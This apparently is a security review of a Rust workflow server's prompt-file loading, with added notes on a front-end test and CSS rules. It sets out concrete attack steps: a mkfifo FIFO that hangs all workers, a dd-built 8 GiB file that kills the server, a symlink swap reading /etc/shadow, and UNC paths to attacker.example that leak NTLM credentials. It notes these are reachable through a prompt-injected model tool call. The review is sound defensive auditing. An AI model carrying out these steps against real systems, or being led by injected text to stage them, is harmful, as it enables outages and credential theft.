finding:
`read_prompt_file` does `std::fs::read_to_string(&canon)` on a path whose CONTENT is attacker-controlled in the `run_from_workspace` family. `runner.rs:1774 workflow_workspace_root()` returns `code_sandbox::config::get_state().workspace_root`, i.e. the very directory bind-mounted read-write into the per-conversation sandbox, and `workflow_mcp/tools.rs:530 load_and_validate_workspace` calls `validate_for_install` against it. Concrete exploit reachable from an LLM tool call (prompt-injectable): inside the sandbox run `mkdir -p flow/prompts && mkfifo flow/prompts/p.md` and write `flow/workflow.yaml` = `steps:
  - id: s
    kind: llm
    prompt_file: prompts/p.md`, then invoke the `validate_from_workspace` MCP verb with dir=flow. `canonicalize()` succeeds on a FIFO and `starts_with(root)` passes, so control reaches `read_to_string`, whose `open(O_RDONLY)` on a FIFO with no writer BLOCKS INDEFINITELY. There is no size cap, no `O_NOFOLLOW`, no file-type check (`is_file()`), and no timeout anywhere on this path.

`read_prompt_file` is a SYNC fn doing unbounded blocking I/O, and every validator caller runs it directly on a tokio worker thread with no `spawn_blocking`: `runner.rs:1248` (inside `pub async fn spawn_run`), `runner.rs:1552` (`pub async fn resume_run`), `handlers/dev.rs:268` (import), `handlers/dev.rs:564` (update), `workflow_mcp/tools.rs:539` (`load_and_validate_workspace`, itself `async fn`). Before this change `check_prompt_files` only did a `canonicalize()` stat; it now reads the whole file. Combined with the FIFO above, N concurrent `validate_from_workspace` calls (N = worker-thread count, default = cores) wedge EVERY runtime worker permanently and the whole HTTP server stops responding. Note the diff's own dispatch side (`dispatch.rs:137`) correctly wraps the same call in `spawn_blocking` — the validator half of the identical change was not updated, and it is the half with no cancellation and no deadline (`validate_for_install` runs in `spawn_run` BEFORE the run task and its `deadline_watcher` at runner.rs:484 even exist).

Unbounded read size: `read_to_string` allocates the entire file with no cap. The import path is capped (`hub/bundle.rs` MAX_BUNDLE_SINGLE_FILE_BYTES = 2 MiB / MAX_BUNDLE_DECOMPRESSED_BYTES = 10 MiB) but the `run_from_workspace` / `validate_from_workspace` / `save_workflow` path validates the LIVE sandbox workspace, which has no such cap — the model writes the file with the sandbox's own quota. `dd if=/dev/zero bs=1M count=8000 | tr '\0' 'a' > flow/prompts/p.md` then `validate_from_workspace` → an 8 GiB `String` allocation on a tokio worker → OOM-kill of the server. Additionally the validator now does work strictly proportional to author-controlled bytes on EVERY launch and EVERY resume (`spawn_run`/`resume_run`), and each file is read TWICE per run (once in `check_prompt_files`, again in `load_raw_prompt`), once per step referencing it.

TOCTOU between the confinement check and the read. `resolved.canonicalize()` (1211) → `starts_with(root_canon)` (1217) → `std::fs::read_to_string(&canon)` (1220): `canon` is a PATH STRING, so the final component is resolved a second time at open. If the attacker replaces `<root>/prompts/p.md` with a symlink to `/etc/shadow` (or to the server's `config/dev.yaml` holding `jwt.secret`) between those two syscalls, the read follows it and the contents are shipped to the LLM. The doc comment at 1203-1206 dismisses this — 'the bundle is server-owned and re-validated immediately before dispatch, so the window is not a trust boundary' — and that justification is FALSE for the workspace verbs, where the 'bundle root' is the model-writable sandbox workspace (`workflow_mcp/tools.rs:539`, root from `workspace::resolve_conversation_workspace_dir`). A sandbox step in the same workflow can also run a background rename loop against the very directory a later `llm` step's `prompt_file` resolves in. Correct fix: open ONCE with `O_NOFOLLOW`, `fstat` the fd for regular-file + size, and read from the fd — never re-open by path.

`check_prompt_file_shape` is Windows-blind: it tests only `rel.contains("..")` and `rel.starts_with('/')`. Windows (a first-class supported target here) has three other absolute forms that all pass this gate and all cause `Path::join` to DISCARD the bundle root: `prompt_file: "C:\\Windows\\win.ini"` (drive prefix), `prompt_file: "\\Windows\\win.ini"` (root-relative, replaces everything but the prefix), and `prompt_file: "\\\\attacker.example\\share\\p.md"` (UNC). The UNC case is the worst: `resolved.canonicalize()` at line 1211 performs the SMB name resolution and connection — an outbound network fetch to an author-chosen host, with an implicit NTLM authentication attempt leaking the service account's NTLMv2 challenge/response — BEFORE the `starts_with` confinement check at 1217 ever runs, and it blocks the calling tokio worker for the SMB connect timeout. Worse, on the no-bundle draft surfaces (`handlers/dev.rs:107` `/validate`, `handlers/dev.rs:953` `/validate-def`) `bundle_present` is false so the confinement half is SKIPPED entirely and these paths draw NO finding at all — the builder reports the workflow clean. The correct primitive already exists two files away and was not reused: `workspace.rs:72-81` walks `rel.components()` and rejects anything that is not `Component::Normal`/`CurDir`.

Unannounced blast-radius change for EXISTING installed data. `read_prompt_file` now returns `Err` for a zero-byte file (`PromptFileError::Empty`), a non-UTF-8 file and a directory, and `check_prompt_files` (1283) turns each into a blocking `WORKFLOW_PROMPT_FILE_MISSING` finding. `validate_for_install` is the FIRST thing `spawn_run` (runner.rs:1248) and `resume_run` (runner.rs:1552) do. So an already-installed workflow whose prompt file happens to be empty or non-UTF-8 — which previously installed, validated green and either ran (with an empty prompt) or failed only that ONE step under its `on_error` policy — now refuses to start at all, and a run parked on a durable (`timeout_ms: 0`) elicit gate becomes PERMANENTLY unresumable. The diff's own decision notes only call out DEC-5 (`prompt: "x"` + `prompt_file: ""`); this much larger migration hazard is not named anywhere and there is no backfill/leniency path.

`PromptFileError::Unreadable(String)` collapses two categories that need opposite handling: 'the author named a file that is not there' (permanent, author-actionable) and 'I could not read it right now' (EACCES / EMFILE / ENFILE / EIO / ESTALE on NFS — transient, operator-actionable). Both map to the semantic code `WORKFLOW_PROMPT_FILE_MISSING` (line 1147) and both now abort the ENTIRE run at `validate_for_install` rather than failing a single step under its `on_error` policy. Under fd exhaustion the whole workflow subsystem hard-fails with an author-blaming message ('cannot be read from the bundle: Too many open files'), and nothing retries. The pre-change code hit only `canonicalize`, which does not consume an fd.

`tokio::task::spawn_blocking` is NOT cancellable. The `LlmDispatcher`/`AgentDispatcher` call sites reach `load_raw_prompt` via `resolve_prompt` (dispatch.rs:182, agent_dispatch.rs:1101) — before the `tokio::select!{ .., cancel }` the module header advertises — and the run-level `deadline_watcher` (runner.rs:484) can only DROP the awaiting future; the blocking-pool thread keeps `read_to_string`ing forever. On a FIFO/hung-NFS prompt file each cancelled run permanently leaks one of the runtime's 512 default blocking threads, and once they are exhausted every `spawn_blocking` in the PROCESS (file ingest, pdfium, sandbox staging) stalls. The wrapping is otherwise correct (no double-wrap: JoinError → String at 139, inner `PromptFileError` → `e.message(rel)` at 142), but a bounded `tokio::time::timeout` around the join handle plus a regular-file/size precheck is required for it to be safe.

`rel.contains("..")` is a substring test, not a path-component test. A legitimate bundle file named `prompts/release..notes.md`, `v1..2/task.md`, or any name with a double dot is rejected with the SECURITY finding `WORKFLOW_PROMPT_FILE_UNSAFE` and the message "must be a bundle-relative path without '..'" — an accusation the author cannot act on except by renaming. This was pre-existing in the validator but the change propagates it into the RUNNER (`load_raw_prompt` → `read_prompt_file` → `check_prompt_file_shape`), so such a workflow now also hard-fails at dispatch. Should be `rel.components().any(|c| matches!(c, Component::ParentDir))`.

`bundle_root.canonicalize().unwrap_or_else(|_| bundle_root.to_path_buf())` swallows the root-canonicalize failure and then compares a FULLY-canonical child against a NON-canonical root, so `canon.starts_with(&root_canon)` fails for every path and the caller is told `WORKFLOW_PROMPT_FILE_ESCAPE` — a security accusation — for what is actually an internal 'I could not resolve the bundle root' condition. Unlike `check_prompt_files` (which gates on `bundle_root.is_dir()` at 1259), `read_prompt_file` has NO root precondition, so the dispatcher reaches this whenever `ctx.extracted_path` cannot be canonicalized (removed mid-run, a permission change on an ancestor). Should be an explicit internal error, not a silent fallback to a mis-typed verdict.

No upper bound is placed on the resulting prompt anywhere between the file and the model. `validate.rs` caps `description` at 200 chars (MAX_STEP_DESCRIPTION_CHARS, line 299) but there is no MAX_PROMPT_* constant, and `PER_CALL_TOKEN_CAP` is explicitly documented as unenforced (dispatch.rs:74). A 2 MiB prompt file (the import cap) becomes a 2 MiB prompt; in `LlmMapDispatcher` that raw prompt is rendered and sent once PER ITEM, up to `max_parallel` = 20 concurrently (MAX_PARALLEL_HARD_CAP), so a single validated workflow can bill an unbounded multiple of it. The change is the first time a FILE (rather than a YAML-embedded string bounded by the workflow.yaml size) can be the prompt source, so a cap belongs on this new edge.

`.map_err(|e| format!("read prompt_file '{rel}': {e}"))` on the `JoinHandle` turns a `JoinError` — i.e. a PANIC inside `read_prompt_file`, or runtime shutdown — into a message indistinguishable from an ordinary read failure, and surfaces it to the workflow author as a prompt-file problem. There is no `tracing::error!` on that arm, so a genuine panic in the path/confinement code leaves no server-side trace at all; the operator sees only 'read prompt_file: task N panicked'.

The falsifiability control is under-anchored relative to its own assertions. `openWithAddons` waits only for SOME addon (any `data-align`) carrying a `> button`, and the per-viewport vacuity guard likewise counts `groups.filter(g => g.hasButtonChild)` across both aligns — but the control test asserts specifically `g.align === 'inline-end' && g.addonPastEdge > JITTER_PX`, and `REVERTED_RULE` only targets `[data-align="inline-end"]`. If the gallery's rendered set ever shifts to inline-START button addons (equally plausible — the two variants are written as a symmetric pair) the main tests keep passing while the control fails spuriously, and the reverse (inline-end present but never with a button) makes the control's own `waitForFunction` time out at 5s with a misleading 'precondition' framing. The guard should require an inline-end addon WITH a button child explicitly.

`has-[>button]:ps-1` and `has-[>kbd]:ps-1.5` (and the `pe` mirror at line 62) are equal-specificity sibling rules setting the SAME property. An addon containing both a `<button>` and a `<kbd>` child — a plausible composition (a shortcut hint beside a clear button) — resolves by CSS source order alone, not by any stated rule, so the padding silently depends on Tailwind's emission order for two utilities the author considers independent. The old negative-margin pair had the same latent ambiguity, so this is not a regression, but the rewrite was the moment to make it explicit (a single `has-[>button]:` branch, or distinct nested selectors).

REJECTED: `canon.starts_with(&root_canon)` prefix confusion (e.g. root `/srv/bundle` vs escape target `/srv/bundle-evil`). `std::path::Path::starts_with` compares whole COMPONENTS, not string prefixes, so `/srv/bundle-evil` does not start_with `/srv/bundle`. Not exploitable.

REJECTED: symlinked BUNDLE ROOT defeating confinement (e.g. `extracted_path` under macOS `/var` → `/private/var`, or a tempdir symlink). Both sides of the comparison are canonicalized independently (`resolved.canonicalize()` at 1211 and `bundle_root.canonicalize()` at 1215), so a symlinked root resolves identically in both and the prefix test still holds. Likewise `.`/`./` segments and repeated separators are normalised away by canonicalize before the comparison.

REJECTED: unicode / percent-encoding bypass of the `..` shape check (`%2e%2e`, U+2024 ONE DOT LEADER, overlong UTF-8). `rel` is a raw YAML/JSON string that is never URL-decoded and is handed straight to `Path::join`; a lookalike codepoint is not `.` to the kernel either, so it names a literal (nonexistent) file rather than a parent directory. The confinement check is the backstop in any case.

REJECTED: host-path disclosure via `PromptFileError::Unreadable(e.to_string())` being embedded verbatim in an author-facing finding. Rust's `std::fs` io::Errors do not carry the offending path (only 'No such file or directory (os error 2)'), and the surfaces that could be used as an existence oracle (`/validate`, `/validate-def`) deliberately pass a never-created root so the read half is skipped (`check_prompt_files:1276`). The remaining callers resolve only inside the caller's own bundle/workspace.

REJECTED: `include_str!("validate.rs")` in `prompt_codes_list_covers_every_prompt_verdict_the_validator_emits` freezing a stale snapshot, contradicting the sibling guard's stated 'never include_str!' rule (validate.rs:1929). For a file in the SAME crate any edit forces a recompile, so the snapshot cannot go stale; the 'read at runtime' rule genuinely only applies to the cross-language TS guard. The scan does over-match string literals inside validate.rs's own `#[cfg(test)]` module, but that direction is conservative (it can only widen PROMPT_CODES, never hide a code).

REJECTED: `prompt_fields()` missing a prompt-bearing step kind, leaving a dispatcher that resolves a prompt_file through the OLD unchecked `join`. Verified exhaustively: the match covers all six `StepConfig` variants with no `_` arm, and the only three dispatchers that resolve wording (`LlmDispatcher` dispatch.rs:182, `LlmMapDispatcher` dispatch.rs:393, `AgentDispatcher` agent_dispatch.rs:1101) all route through `resolve_prompt`/`load_raw_prompt`. No `prompt_file` join survives elsewhere in the module.

REJECTED: `promptSuppliedByFile` tightening from `typeof pf === 'string'` to `typeof pf === 'string' && pf.length > 0` silently breaking an existing draft. The change moves the client onto the backend's rule (an empty `prompt_file:` is ABSENT), so a draft with `prompt_file: ''` now correctly shows 'A prompt is required' instead of a blank unexplained box; and `WORKFLOW_PROMPT_FILE_MISSING`/`_ESCAPE` remain in `WorkflowBuilder.store.ts:105 UNDECIDABLE_BY_DEF_CHECK`, so no stored save-failure is spuriously retired.
